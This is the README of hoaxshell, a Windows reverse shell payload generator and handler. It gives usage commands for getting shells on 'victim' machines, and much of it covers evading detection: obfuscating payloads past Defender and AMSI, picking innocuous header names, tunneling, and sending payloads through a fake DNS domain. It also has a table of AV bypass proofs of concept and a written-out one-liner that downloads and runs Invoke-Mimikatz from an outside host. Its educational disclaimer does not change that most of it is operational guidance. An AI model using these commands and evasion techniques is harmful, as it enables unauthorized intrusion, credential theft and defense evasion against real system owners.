# hoaxshell
[![Python](https://img.shields.io/badge/Python-%E2%89%A5%203.6-yellow.svg)](https://www.python.org/) 
<img src="https://img.shields.io/badge/PowerShell-%E2%89%A5%20v3.0-blue">
<img src="https://img.shields.io/badge/Developed%20on-kali%20linux-blueviolet">
[![License](https://img.shields.io/badge/License-BSD-red.svg)](https://github.com/t3l3machus/hoaxshell/blob/main/LICENSE.md)
<img src="https://img.shields.io/badge/Maintained%3F-Yes-96c40f">

 ### ⚡ Check out the evolution of this tool -> [github.com/t3l3machus/Villain](https://github.com/t3l3machus/Villain) ⚡

#### :warning: As of 2022-10-18, hoaxshell is detected by AMSI ([malware-encyclopedia](https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?name=VirTool%3aPowerShell%2fXoashell.A&threatid=2147833654)). You need to obfuscate the generated payload in order to use. Check out this video on how to obfuscate manually and bypass MS Defender -> [youtube.com/watch?v=iElVfagdCD4](https://www.youtube.com/watch?v=iElVfagdCD4)

## Purpose
hoaxshell is a Windows reverse shell payload generator and handler that abuses the http(s) protocol to establish a beacon-like reverse shell, based on the following concept:  

![image](https://user-images.githubusercontent.com/75489922/197529603-1c9238ea-af14-41f7-8834-dd37ad77e809.png)

This concept (which could possibly be implemented by using protocols other than http or even sockets / pre-installed exes) can be used to establish sessions that promote the illusion of having an actuall shell. Compared to traditional reverse shells this is kind of fake, that's why despite the name of the tool, i like to reffer to such implementations as a hoaxshell.

A bit unconventional as it is, hoaxshell did well against AV solutions (check [AV bypass PoCs table](#AV-Bypass-PoCs) for more info). Although it is now detected by Microsoft Defender, it is easy to obfuscate the generated payload(s) using other tools or even manually.

Tested against fully updated **Windows 11 Enterprise**, **Windows Server 2016 Datacenter** and **Windows 10 Pro** boxes.

**Disclaimer**: Purely made for testing and educational purposes. DO NOT run the payloads generated by this tool against hosts that you do not have explicit permission and authorization to test. You are responsible for any trouble you may cause by using this tool.

### Video Presentations  
[2022-10-11] Recent & awesome, made by @JohnHammond -> [youtube.com/watch?v=fgSARG82TJY](https://www.youtube.com/watch?v=fgSARG82TJY)  
[2022-07-15] Original release demo, made by me -> [youtube.com/watch?v=SEufgD5UxdU](https://www.youtube.com/watch?v=SEufgD5UxdU)

## Screenshots
![image](https://user-images.githubusercontent.com/75489922/196024757-fcb13b73-153c-426f-a87c-bf35fd3e784d.png)
  
Find more screenshots [here](screenshots/).

## Installation
```
git clone https://github.com/t3l3machus/hoaxshell
cd ./hoaxshell
sudo pip3 install -r requirements.txt
chmod +x hoaxshell.py
```

## Usage
**Important**: As a means of avoiding detection, hoaxshell is automatically generating random values for the session id, URL paths and name of a custom http header utilized in the process, every time the script is started. The generated payload will work only for the instance it was generated for. Use the `-g` option to bypass this behaviour and re-establish an active session or reuse a past generated payload with a new instance of hoaxshell. 

### Basic shell session over http
When you run hoaxshell, it will generate its own PowerShell payload for you to copy and inject on the victim. By default, the payload is base64 encoded for convenience. If you need the payload raw, execute the "rawpayload" prompt command or start hoaxshell with the `-r` argument. After the payload has been executed on the victim, you'll be able to run PowerShell commands against it.  

#### Payload that utilizes `Invoke-Expression` (default)
```
sudo python3 hoaxshell.py -s <your_ip>
```  

#### Payload that writes and executes commands from a file
Use `-x` to provide a .ps1 file name (absolute path) to be created on the victim machine. You should check the raw payload before executing, make sure the path you provided is solid.
```
sudo python3 hoaxshell.py -s <your_ip> -x "C:\Users\\\$env:USERNAME\.local\hack.ps1"
```  

### Recommended usage to avoid detection (over http)
Hoaxshell utilizes an http header to transfer shell session info. By default, the header is given a random name which can be detected by regex-based AV rules. Use -H to provide a standard or custom http header name to avoid detection.
```
sudo python3 hoaxshell.py -s <your_ip> -i -H "Authorization"
sudo python3 hoaxshell.py -s <your_ip> -i -H "Authorization" -x "C:\Users\\\$env:USERNAME\.local\hack.ps1"
```

### Encrypted shell session (https + self-signed certificate)
This particular payload is kind of a red flag, as it begins with an additional block of code that instructs PowerShell to skip SSL certificate checks, which makes it suspicious and easy to detect as well as significantly longer in length. Not recommended.
```
# Generate self-signed certificate:
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365

# Pass the cert.pem and key.pem as arguments:
sudo python3 hoaxshell.py -s <your_ip> -c </path/to/cert.pem> -k <path/to/key.pem>

```  

### Encrypted shell session with a trusted certificate
If you own a domain, use this option to generate a shorter and less detectable https payload by providing your DN with -s along with a trusted certificate (-c cert.pem -k privkey.pem).
```
sudo python3 hoaxshell.py -s <your.domain.com> -t -c </path/to/cert.pem> -k <path/to/key.pem>
```

### Grab session mode
In case you close your terminal accidentally, have a power outage or something, you can start hoaxshell in grab session mode, it will attempt to re-establish a session, given that the payload is still running on the victim machine.
```
sudo python3 hoaxshell.py -s <your_ip> -g
```  
**Important**: Make sure to start hoaxshell with the same settings as the session you are trying to restore (http/https, port, etc).

### Constraint language mode support
Use any of the payload variations with the `-cm` (--constraint-mode) option to generate a payload that works even if the victim is configured to run PS in Constraint Language mode. By using this option, you sacrifice a bit of your reverse shell's stdout decoding accuracy.

```
sudo python3 hoaxshell.py -s <your_ip> -cm
```  
![image](https://user-images.githubusercontent.com/75489922/195785804-7fa3da9b-a10f-4c72-895a-0648271e7ec6.png)


### Shell session over https using tunneling tools ([Ngrok](https://ngrok.com) / [LocalTunnel](https://localtunnel.me))
Utilize tunnelling programmes **Ngrok** or **LocalTunnel** to get sessions through secure tunnels, overcominge issues like not having a Static IP address or your ISP forbidding Port-Forwarding.

Use `-ng` or `--ngrok` for Ngrok server
```
sudo python3 hoaxshell.py -ng
```

Use `-lt` or `--localtunnel` for LocalTunnel server
```
sudo python3 hoaxshell.py -lt
```

### Using a self-hosted DNS server, transmit the payload via fake domain

Use `-dns` or `--dns-server` to start a **DNS server** on port `53`. On the victim's computer, the DNS payload will be executed, and the chunks of **TXT** records will be received to construct the actual payload. The DNS server will also attempt to resolve the fake domain name provided with the `-d` argument and will return the fake/false information. This way, you can use a fake domain name to transmit the payload to the victim machine. 

Use `-dns` or `--dns-server` to start the server.
There are some required arguments for this mode:

| Argument | Description |
| --- | --- |
| `-s` / `--server-ip` | Your server IP |
|`-d` / `--domain` | The fake domain name to be used. |
|`-udp` / `--udp` | The UDP based server to be used for DNS queries. |
|`-tcp` / `--tcp` | The TCP based server to be used for DNS queries. |

#### **Examples:**
For UDP based DNS server:
```
sudo python3 hoaxshell.py -s <your_ip> -dns -d <your.fake-domain.com> -udp 
```
For TCP based DNS server:
```
sudo python3 hoaxshell.py -s <your_ip> -dns -d <your.fake-domain.com> -tcp 
```
For both UDP and TCP based DNS servers at a time:
```
sudo python3 hoaxshell.py -s <your_ip> -dns -d <your.fake-domain.com> -udp -tcp 
```

***Note:** Due to the limitation that PowerShell's `Resolve-DnsName` cmdlet does not support custom ports. This feature will only work if you have port **53** open on your server. Therefore, you cannot use it with any tunneling option. (`-lt` or `-ng`)*


## Limitations
The shell is going to hang if you execute a command that initiates an interactive session. Example:  
```
# this command will execute succesfully and you will have no problem: 
> powershell echo 'This is a test'

# But this one will open an interactive session within the hoaxshell session and is going to cause the shell to hang:
> powershell

# In the same manner, you won't have a problem executing this:
> cmd /c dir /a

# But this will cause your hoaxshell to hang:
> cmd.exe
```  

So, if you for example would like to run mimikatz throught hoaxshell you would need to invoke the commands:
```
hoaxshell > IEX(New-Object Net.WebClient).DownloadString('http://192.168.0.13:4443/Invoke-Mimikatz.ps1');Invoke-Mimikatz -Command '"PRIVILEGE::Debug"'
```
Long story short, you have to be careful to not run an exe or cmd that starts an interactive session within the hoaxshell powershell context.

## AV Bypass PoCs
Some awesome people were kind enough to send me/publish PoC videos of executing hoaxshell's payloads against systems running AV solutions other than MS Defender, without being detected. Below is a reference table with links:

**Important**: I don't know if you can still use hoaxshell effectively to bypass these solutions. It's only reasonable to assume the detectability will change soon (if not already).

| AV Solution  | Date  | PoC  |
|---|---|---|
| SentinelOne | 2022-10-18 | https://twitter.com/i/status/1582137400880336896 |
| Norton | 2022-10-17 | https://twitter.com/i/status/1582278579244929024 |
| Bitdefender  | 2022-10-15  | https://www.linkedin.com/posts/rohitjain-19_hoaxshell-cy83rr0h1t-penetrationtesting-activity-6987080745139765248-8cdT?utm_source=share&utm_medium=member_desktop  |
| McAfee  | 2022-10-15  | https://twitter.com/i/status/1581605531365814273  |
| Kaspersky | 2022-10-13 | https://www.youtube.com/watch?v=IyMH_eCC4Rk |
| Sophos  | 2022-09-08  | https://www.youtube.com/watch?v=NYR0rWx4x8k  |


## News
- `2022-10-24` - Added `-dns` option to start a self-hosted **DNS server** that will serve the payload to the victim's machine using DNS resolution. This way, you can use a fake domain name to transmit the payload to the victim machine.
 - `13/10/2022` - Added constraint language mode support (-cm) option.
 - `08/10/2022` - Added the `-ng` and `-lt` options that generate PS payloads for obtaining sessions using tunnelling tools **ngrok** or **localtunnel** in order to get around limitations like Static IP addresses and Port-Forwarding.  
 - `06/09/2022` - A new payload was added that writes the commands to be executed in a file instead of utilizing `Invoke-Expression`. To use this, the user must provide a .ps1 file name (absolute path) on the victim machine using the `-x` option.  
 - `04/09/2022` - Modifications were made to improve the command delivery mechanism as it included components that could be easily flagged. The `-t` option along with the `https_payload_trusted.ps1` were added. You can now use hoaxshell by supplying a domain name along with a trusted certificate. This will generate a shorter and less detectable https payload.  
 - `01/09/2022` - Added the `-H` option which allows users to give a custom name to the (random by default) header utilized in the attack process, carring the shell's session id. This makes the attack less detectable e.g. by using a standard header name e.g. "Authorization".
 - `31/08/2022` - Added the `-i` option that generates the PS payload adjusted to use "Invoke-RestMethod' instead of 'Invoke-WebRequest' utility, so now the user can choose (thanks to this [issue](https://github.com/t3l3machus/hoaxshell/issues/8)). I also fixed a bug that existed in the prompt (it sometimes messed the path).  
